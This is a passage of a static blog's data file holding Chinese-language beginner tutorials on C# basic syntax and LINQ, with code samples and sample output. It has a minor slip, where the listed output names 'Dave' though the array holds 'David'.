class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"🔹-LINQ（查询语法）\"><a href=\"#🔹-LINQ（查询语法）\" class=\"headerlink\" title=\"🔹 LINQ（查询语法）\"></a>🔹 LINQ（查询语法）</h3><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">int</span>[] nums = &#123; <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> even = <span class=\"keyword\">from</span> n <span class=\"keyword\">in</span> nums</span><br><span class=\"line\">           <span class=\"keyword\">where</span> n % <span class=\"number\">2</span> == <span class=\"number\">0</span></span><br><span class=\"line\">           <span class=\"keyword\">select</span> n;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span> (<span class=\"keyword\">var</span> n <span class=\"keyword\">in</span> even)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Console.WriteLine(n);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"7️⃣-数组与集合\"><a href=\"#7️⃣-数组与集合\" class=\"headerlink\" title=\"7️⃣ 数组与集合\"></a>7️⃣ 数组与集合</h2><h3 id=\"数组\"><a href=\"#数组\" class=\"headerlink\" title=\"数组\"></a>数组</h3><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">int</span>[] numbers = &#123; <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span> &#125;;</span><br><span class=\"line\">Console.WriteLine(numbers[<span class=\"number\">0</span>]);  <span class=\"comment\">// 1</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"List（动态数组）\"><a href=\"#List（动态数组）\" class=\"headerlink\" title=\"List（动态数组）\"></a>List（动态数组）</h3><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">using</span> System.Collections.Generic;</span><br><span class=\"line\"></span><br><span class=\"line\">List&lt;<span class=\"built_in\">string</span>&gt; list = <span class=\"keyword\">new</span> List&lt;<span class=\"built_in\">string</span>&gt;();</span><br><span class=\"line\">list.Add(<span class=\"string\">&quot;Apple&quot;</span>);</span><br><span class=\"line\">list.Add(<span class=\"string\">&quot;Banana&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span> (<span class=\"keyword\">var</span> item <span class=\"keyword\">in</span> list)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Console.WriteLine(item);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Dictionary（键值对）\"><a href=\"#Dictionary（键值对）\" class=\"headerlink\" title=\"Dictionary（键值对）\"></a>Dictionary（键值对）</h3><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Dictionary&lt;<span class=\"built_in\">string</span>, <span class=\"built_in\">int</span>&gt; scores = <span class=\"keyword\">new</span> Dictionary&lt;<span class=\"built_in\">string</span>, <span class=\"built_in\">int</span>&gt;();</span><br><span class=\"line\">scores[<span class=\"string\">&quot;Alice&quot;</span>] = <span class=\"number\">90</span>;</span><br><span class=\"line\">scores[<span class=\"string\">&quot;Bob&quot;</span>] = <span class=\"number\">85</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Console.WriteLine(scores[<span class=\"string\">&quot;Alice&quot;</span>]);  <span class=\"comment\">// 90</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n","excerpt":"","more":"<h1 id=\"🚀-Day-01-C-基础语法\"><a href=\"#🚀-Day-01-C-基础语法\" class=\"headerlink\" title=\"🚀 Day 01  C#基础语法\"></a>🚀 Day 01  C#基础语法</h1><p>C#（C-Sharp）是微软开发的现代编程语言，运行在 <strong>.NET 平台</strong> 上。它语法与 Java、C++ 相似，但功能更强大，语法更现代化。</p>\n<p> C# 的基础语法内容包括：</p>\n<ol>\n<li>程序入口</li>\n<li>数据类型</li>\n<li>条件与循环</li>\n<li>方法</li>\n<li>面向对象（OOP）</li>\n<li>语言亮点</li>\n<li>数组与集合</li>\n</ol>\n<hr>\n<h2 id=\"1️⃣-程序入口\"><a href=\"#1️⃣-程序入口\" class=\"headerlink\" title=\"1️⃣ 程序入口\"></a>1️⃣ 程序入口</h2><p>所有 C# 程序都从 <code>Main</code> 方法开始执行：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">using</span> System;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title\">Program</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>(<span class=\"params\"><span class=\"built_in\">string</span>[] <span class=\"keyword\">args</span></span>)</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">&quot;Hello, C#!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>using System;</code>：引入命名空间（类似 Java 的 <code>import</code>）。</li>\n<li><code>class Program</code>：定义类。</li>\n<li><code>static void Main(string[] args)</code>：程序入口。</li>\n<li><code>Console.WriteLine()</code>：打印输出。</li>\n</ul>\n<hr>\n<h2 id=\"2️⃣-数据类型\"><a href=\"#2️⃣-数据类型\" class=\"headerlink\" title=\"2️⃣ 数据类型\"></a>2️⃣ 数据类型</h2><p>C# 是强类型语言，常见数据类型如下：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">int</span> age = <span class=\"number\">20</span>;           <span class=\"comment\">// 整数</span></span><br><span class=\"line\"><span class=\"built_in\">double</span> price = <span class=\"number\">9.99</span>;    <span class=\"comment\">// 浮点数</span></span><br><span class=\"line\"><span class=\"built_in\">char</span> grade = <span class=\"string\">&#x27;A&#x27;</span>;       <span class=\"comment\">// 字符</span></span><br><span class=\"line\"><span class=\"built_in\">string</span> name = <span class=\"string\">&quot;Alice&quot;</span>;  <span class=\"comment\">// 字符串</span></span><br><span class=\"line\"><span class=\"built_in\">bool</span> isActive = <span class=\"literal\">true</span>;   <span class=\"comment\">// 布尔</span></span><br></pre></td></tr></table></figure>\n\n<p>👉 类型推断：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> city = <span class=\"string\">&quot;Tokyo&quot;</span>;   <span class=\"comment\">// 自动推断 string</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> number = <span class=\"number\">123</span>;     <span class=\"comment\">// 自动推断 int</span></span><br></pre></td></tr></table></figure>\n\n<p>👉 常见数值类型范围：</p>\n<ul>\n<li><code>int</code>：32 位整数</li>\n<li><code>long</code>：64 位整数</li>\n<li><code>float</code>：32 位浮点数（要加 <code>f</code> 后缀，如 <code>3.14f</code>）</li>\n<li><code>double</code>：64 位浮点数</li>\n<li><code>decimal</code>：高精度小数（常用于金融计算，后缀 <code>m</code>）</li>\n</ul>\n<hr>\n<h2 id=\"3️⃣-条件与循环\"><a href=\"#3️⃣-条件与循环\" class=\"headerlink\" title=\"3️⃣ 条件与循环\"></a>3️⃣ 条件与循环</h2><h3 id=\"条件语句\"><a href=\"#条件语句\" class=\"headerlink\" title=\"条件语句\"></a>条件语句</h3><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">int</span> age = <span class=\"number\">18</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (age &gt;= <span class=\"number\">18</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Console.WriteLine(<span class=\"string\">&quot;Adult&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Console.WriteLine(<span class=\"string\">&quot;Minor&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>switch</code> 语句（支持字符串）：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">string</span> color = <span class=\"string\">&quot;red&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">switch</span> (color)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"string\">&quot;red&quot;</span>:</span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">&quot;Stop!&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"string\">&quot;green&quot;</span>:</span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">&quot;Go!&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"literal\">default</span>:</span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">&quot;Unknown&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h3 id=\"循环语句\"><a href=\"#循环语句\" class=\"headerlink\" title=\"循环语句\"></a>循环语句</h3><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// for 循环</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"built_in\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">5</span>; i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Console.WriteLine(i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// while 循环</span></span><br><span class=\"line\"><span class=\"built_in\">int</span> n = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span> (n &lt; <span class=\"number\">3</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Console.WriteLine(n);</span><br><span class=\"line\">    n++;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// foreach 循环</span></span><br><span class=\"line\"><span class=\"built_in\">string</span>[] fruits = &#123; <span class=\"string\">&quot;Apple&quot;</span>, <span class=\"string\">&quot;Banana&quot;</span>, <span class=\"string\">&quot;Orange&quot;</span> &#125;;</span><br><span class=\"line\"><span class=\"keyword\">foreach</span> (<span class=\"keyword\">var</span> f <span class=\"keyword\">in</span> fruits)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Console.WriteLine(f);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"4️⃣-方法（函数）\"><a href=\"#4️⃣-方法（函数）\" class=\"headerlink\" title=\"4️⃣ 方法（函数）\"></a>4️⃣ 方法（函数）</h2><p>C# 方法定义与调用：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"built_in\">int</span> <span class=\"title\">Add</span>(<span class=\"params\"><span class=\"built_in\">int</span> a, <span class=\"built_in\">int</span> b</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a + b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">SayHello</span>(<span class=\"params\"><span class=\"built_in\">string</span> name = <span class=\"string\">&quot;World&quot;</span></span>)  <span class=\"comment\">// 默认参数</span></span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Console.WriteLine(<span class=\"string\">&quot;Hello, &quot;</span> + name);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> result = Add(<span class=\"number\">3</span>, <span class=\"number\">4</span>);</span><br><span class=\"line\">    Console.WriteLine(result);   <span class=\"comment\">// 7</span></span><br><span class=\"line\"></span><br><span class=\"line\">    SayHello();                  <span class=\"comment\">// Hello, World</span></span><br><span class=\"line\">    SayHello(<span class=\"string\">&quot;Alice&quot;</span>);           <span class=\"comment\">// Hello, Alice</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"5️⃣-面向对象（OOP）\"><a href=\"#5️⃣-面向对象（OOP）\" class=\"headerlink\" title=\"5️⃣ 面向对象（OOP）\"></a>5️⃣ 面向对象（OOP）</h2><p>C# 是 <strong>面向对象语言</strong>，支持类、对象、继承、多态。</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title\">Person</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 属性（自动生成 getter/setter）</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"built_in\">string</span> Name &#123; <span class=\"keyword\">get</span>; <span class=\"keyword\">set</span>; &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"built_in\">int</span> Age &#123; <span class=\"keyword\">get</span>; <span class=\"keyword\">set</span>; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 方法</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">Introduce</span>()</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">$&quot;Hi, I&#x27;m <span class=\"subst\">&#123;Name&#125;</span>, <span class=\"subst\">&#123;Age&#125;</span> years old.&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title\">Program</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>()</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        Person p = <span class=\"keyword\">new</span> Person &#123; Name = <span class=\"string\">&quot;Alice&quot;</span>, Age = <span class=\"number\">20</span> &#125;;</span><br><span class=\"line\">        p.Introduce();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>👉 属性写法 <code>public string Name &#123; get; set; &#125;</code> 比 Java 的 <code>getter/setter</code> 简洁很多。</p>\n<hr>\n<h2 id=\"6️⃣-语言亮点\"><a href=\"#6️⃣-语言亮点\" class=\"headerlink\" title=\"6️⃣ 语言亮点\"></a>6️⃣ 语言亮点</h2><p>C# 有许多现代化特性，比 Java 更简洁：</p>\n<h3 id=\"🔹-字符串插值\"><a href=\"#🔹-字符串插值\" class=\"headerlink\" title=\"🔹 字符串插值\"></a>🔹 字符串插值</h3><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">string</span> name = <span class=\"string\">&quot;Alice&quot;</span>;</span><br><span class=\"line\"><span class=\"built_in\">int</span> age = <span class=\"number\">20</span>;</span><br><span class=\"line\">Console.WriteLine(<span class=\"string\">$&quot;Hello, I&#x27;m <span class=\"subst\">&#123;name&#125;</span>, <span class=\"subst\">&#123;age&#125;</span> years old.&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"🔹-异步编程（async-await）\"><a href=\"#🔹-异步编程（async-await）\" class=\"headerlink\" title=\"🔹 异步编程（async&#x2F;await）\"></a>🔹 异步编程（async&#x2F;await）</h3><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">async</span> Task <span class=\"title\">Download</span>()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Console.WriteLine(<span class=\"string\">&quot;Downloading...&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">await</span> Task.Delay(<span class=\"number\">1000</span>);</span><br><span class=\"line\">    Console.WriteLine(<span class=\"string\">&quot;Done!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"🔹-LINQ（查询语法）\"><a href=\"#🔹-LINQ（查询语法）\" class=\"headerlink\" title=\"🔹 LINQ（查询语法）\"></a>🔹 LINQ（查询语法）</h3><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">int</span>[] nums = &#123; <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> even = <span class=\"keyword\">from</span> n <span class=\"keyword\">in</span> nums</span><br><span class=\"line\">           <span class=\"keyword\">where</span> n % <span class=\"number\">2</span> == <span class=\"number\">0</span></span><br><span class=\"line\">           <span class=\"keyword\">select</span> n;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span> (<span class=\"keyword\">var</span> n <span class=\"keyword\">in</span> even)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Console.WriteLine(n);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"7️⃣-数组与集合\"><a href=\"#7️⃣-数组与集合\" class=\"headerlink\" title=\"7️⃣ 数组与集合\"></a>7️⃣ 数组与集合</h2><h3 id=\"数组\"><a href=\"#数组\" class=\"headerlink\" title=\"数组\"></a>数组</h3><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">int</span>[] numbers = &#123; <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span> &#125;;</span><br><span class=\"line\">Console.WriteLine(numbers[<span class=\"number\">0</span>]);  <span class=\"comment\">// 1</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"List（动态数组）\"><a href=\"#List（动态数组）\" class=\"headerlink\" title=\"List（动态数组）\"></a>List（动态数组）</h3><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">using</span> System.Collections.Generic;</span><br><span class=\"line\"></span><br><span class=\"line\">List&lt;<span class=\"built_in\">string</span>&gt; list = <span class=\"keyword\">new</span> List&lt;<span class=\"built_in\">string</span>&gt;();</span><br><span class=\"line\">list.Add(<span class=\"string\">&quot;Apple&quot;</span>);</span><br><span class=\"line\">list.Add(<span class=\"string\">&quot;Banana&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span> (<span class=\"keyword\">var</span> item <span class=\"keyword\">in</span> list)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Console.WriteLine(item);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Dictionary（键值对）\"><a href=\"#Dictionary（键值对）\" class=\"headerlink\" title=\"Dictionary（键值对）\"></a>Dictionary（键值对）</h3><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Dictionary&lt;<span class=\"built_in\">string</span>, <span class=\"built_in\">int</span>&gt; scores = <span class=\"keyword\">new</span> Dictionary&lt;<span class=\"built_in\">string</span>, <span class=\"built_in\">int</span>&gt;();</span><br><span class=\"line\">scores[<span class=\"string\">&quot;Alice&quot;</span>] = <span class=\"number\">90</span>;</span><br><span class=\"line\">scores[<span class=\"string\">&quot;Bob&quot;</span>] = <span class=\"number\">85</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Console.WriteLine(scores[<span class=\"string\">&quot;Alice&quot;</span>]);  <span class=\"comment\">// 90</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n"},{"title":"Day 02 LINQ","date":"2025-09-03T16:00:00.000Z","top_img":"/images/background/东方/1.jpg","cover":"/images/background/东方/04.jpg","_content":"# LINQ \n\n## 1. 什么是 LINQ？\n\nLINQ（Language Integrated Query，语言集成查询）是 C# 3.0 引入的一种查询语法，它让你能用类似 SQL 的语法来操作集合（对象、数组、XML、数据库数据等）。正是因为LINQ可以像SQL一样操作数据库，所以也被人戏称为db(database)。\n **核心思想**：用一种统一的方式查询不同的数据源。\n\n比如你要筛选一个数组中的偶数：\n\n```csharp\nusing System;\nusing System.Linq;\n\nclass Program\n{\n    static void Main()\n    {\n        int[] numbers = { 1, 2, 3, 4, 5, 6 };\n\n        // 使用 LINQ 查询语法\n        var evens = from n in numbers\n                    where n % 2 == 0\n                    select n;\n\n        Console.WriteLine(\"偶数有：\");\n        foreach (var n in evens)\n        {\n            Console.WriteLine(n);\n        }\n    }\n}\n```\n\n输出：\n\n```\n偶数有：\n2\n4\n6\n```\n\n这段代码看起来是不是有点像 SQL？\n\n```sql\nSELECT n FROM numbers WHERE n % 2 == 0;\n```\n\n\n **查询表达式语法（Query Syntax）**\n    LINQ 的语法参考了 SQL，例如 `from ... where ... select`，让 C# 程序员不用学习另一套 DSL，就能在代码里写“查询语句”。\n\n------\n\n## 2. 方法语法（Method Syntax）\n\n除了查询语法，LINQ 还有一种 **链式方法写法**，更贴近函数式编程。在C#中，LINQ 的方法语法使用了一系列扩展方法，这些方法定义在 `System.Linq` 命名空间中。(在C#里习惯称函数为方法。)\n\n```csharp\nusing System;\nusing System.Linq;\n\nclass Program\n{\n    static void Main()\n    {\n        string[] names = { \"Alice\", \"Bob\", \"Charlie\", \"David\" };\n\n        // 方法语法\n        var shortNames = names\n            .Where(n => n.Length <= 4)\n            .OrderBy(n => n.Length);\n\n        Console.WriteLine(\"名字长度 <= 4:\");\n        foreach (var name in shortNames)\n        {\n            Console.WriteLine(name);\n        }\n    }\n}\n```\n筛选名字长度 <= 4 的人,并按名字长度升序排序。  \n输出：\n\n```\n名字长度 <= 4:\nBob\nDave\n```\n\n------\n\n## 3. 常用操作\n\n| 操作符    | 功能                  | 示例                            |\n| --------- | --------------------- | ------------------------------- |\n| `Where`   | 过滤数据              | `list.Where(x => x > 10)`       |\n| `Select`  | 投影（选择字段）      | `list.Select(x => x.Name)`      |\n| `OrderBy` | 排序 (默认升序)       | `list.OrderBy(x => x.Age)`      |\n| `GroupBy` | 分组                  | `list.GroupBy(x => x.Category)` |\n| `Join`    | 连接（类似 SQL JOIN） | `list1.Join(list2, ...)`        |\n\n------\n\n## 4.数据库 查询\n\n如果你用 Entity Framework，LINQ 可以直接写 SQL 风格的查询：\n\n```csharp\nusing (var context = new MyDbContext())\n{\n    var students = from s in context.Students\n                   where s.Age > 18\n                   orderby s.Name\n                   select s;\n\n    foreach (var student in students)\n    {\n        Console.WriteLine($\"{student.Name} - {student.Age}\");\n    }\n}\n```\n\n这里的 `context.Students` 其实不是数组，而是 **IQueryable**，LINQ 会把表达式树翻译成 SQL：\n\n```sql\nSELECT [s].[Name], [s].[Age]\nFROM [Students] AS [s]\nWHERE [s].[Age] > 18\nORDER BY [s].[Name];\n```\n\n所以看起来就是 **“像写 SQL 一样写 C# 代码”**。\n\n------\n\n## 5. 总结\n\n- LINQ = 统一的查询语法，让你用一种写法查询不同数据源。\n- 它借鉴了 SQL 语法（`from / where / select`），看起来很像数据库操作。\n- 既能操作内存数据，也能查询数据库、XML、集合等。","source":"_posts/Day 02 LINQ.md","raw":"---\ntitle: Day 02 LINQ\ndate: 2025-09-04\ntags: LINQ\ncategories: Csharp\ntop_img: /images/background/东方/1.jpg\ncover: /images/background/东方/04.jpg\n---\n# LINQ \n\n## 1. 什么是 LINQ？\n\nLINQ（Language Integrated Query，语言集成查询）是 C# 3.0 引入的一种查询语法，它让你能用类似 SQL 的语法来操作集合（对象、数组、XML、数据库数据等）。正是因为LINQ可以像SQL一样操作数据库，所以也被人戏称为db(database)。\n **核心思想**：用一种统一的方式查询不同的数据源。\n\n比如你要筛选一个数组中的偶数：\n\n```csharp\nusing System;\nusing System.Linq;\n\nclass Program\n{\n    static void Main()\n    {\n        int[] numbers = { 